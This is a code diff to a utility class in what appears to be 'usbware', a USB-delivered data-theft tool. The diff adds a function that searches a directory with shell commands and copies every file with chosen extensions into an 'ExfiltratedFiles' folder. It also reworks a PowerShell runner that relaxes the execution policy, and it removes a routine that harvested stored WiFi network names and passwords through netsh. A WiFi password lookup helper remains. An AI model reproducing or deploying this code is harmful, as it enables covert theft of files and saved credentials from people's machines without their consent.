@@ -1,6 +1,7 @@
 package com.github.thatcherdev.usbware.backend;
 
 import java.io.BufferedReader;
+import java.io.File;
 import java.io.InputStreamReader;
 import java.net.Inet4Address;
 import java.net.Inet6Address;
@@ -9,6 +10,7 @@ import java.net.NetworkInterface;
 import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.Enumeration;
+import org.apache.commons.io.FileUtils;
 import com.github.thatcherdev.usbware.usbware.USBware;
 
 public class Utils {
@@ -80,16 +82,34 @@ public class Utils {
 	}
 
 	/**
-	 * Run PowerShell script {@link scriptName}.
+	 * Run PowerShell script {@link script}.
 	 * 
-	 * @param scriptName name of script to run
-	 * @return completion state
+	 * @param script name of script to run
+	 * @return Response from script
 	 */
-	public static boolean runPSScript(String scriptName) {
-		if(runCommand("Powershell.exe -executionpolicy remotesigned -File scripts\\"+scriptName).equals("Command did not produce a response"))
+	public static String runPSScript(String script) {
+		return runCommand("Powershell.exe -executionpolicy remotesigned -File scripts\\"+script);
+	}
+
+	/**
+	 * Copies all files with extensions that match {@link exts} in {@link root} to
+	 * 'gathered\ExfiltartedFiles'.
+	 * 
+	 * @param root directory to search though
+	 * @param exts list of extensions
+	 * @return state of completion
+	 */
+	public static boolean exfilFiles(String root, ArrayList<String> exts) {
+		try{
+			new File("gathered\\ExfiltratedFiles").mkdir();
+			for(String ext:exts)
+				for(String file:new ArrayList<String>(Arrays.asList(Utils.runCommand("c: && cd "+root+" && dir/b/s/a:-d *."+ext).split("\n"))))
+					if(!file.equals("File Not Found"))
+						FileUtils.copyFile(new File(file), new File("gathered\\ExfiltratedFiles\\"+file.substring(file.lastIndexOf("\\")+1)));
 			return true;
-		else
+		}catch(Exception e){
 			return false;
+		}
 	}
 
 	/**
@@ -111,25 +131,6 @@ public class Utils {
 	}
 
 	/**
-	 * @return All stored WiFi SSIDs along with their passwords
-	 */
-	public static String allWiFiPass() {
-		try{
-			String ret="";
-			String profiles=Utils.runCommand("c: && cd C:\\Windows\\System32 && netsh wlan show profiles");
-			for(String profile:new ArrayList<String>(Arrays.asList(profiles.substring(profiles.indexOf(":")+1).split("\n"))))
-				if(profile.contains("Profile") && profile.contains(":")){
-					String ssid=profile.substring(profile.indexOf(":")+2);
-					String pass=getPass(ssid);
-					ret+="SSID:\t"+ssid+"\nPass:\t"+pass+"\n\n";
-				}
-			return ret;
-		}catch(Exception e){
-			return "An error occurred when trying to get SSIDs and passwords";
-		}
-	}
-
-	/**
 	 * @param ssid SSID of network to get password of
 	 * @return password of WiFi network with SSID {@link ssid}
 	 */
@@ -146,7 +147,7 @@ public class Utils {
 	}
 
 	/**
-	 * @return Private IP address of current machine
+	 * @return IPv4 address of current machine
 	 */
 	public static String getIP() {
 		try{
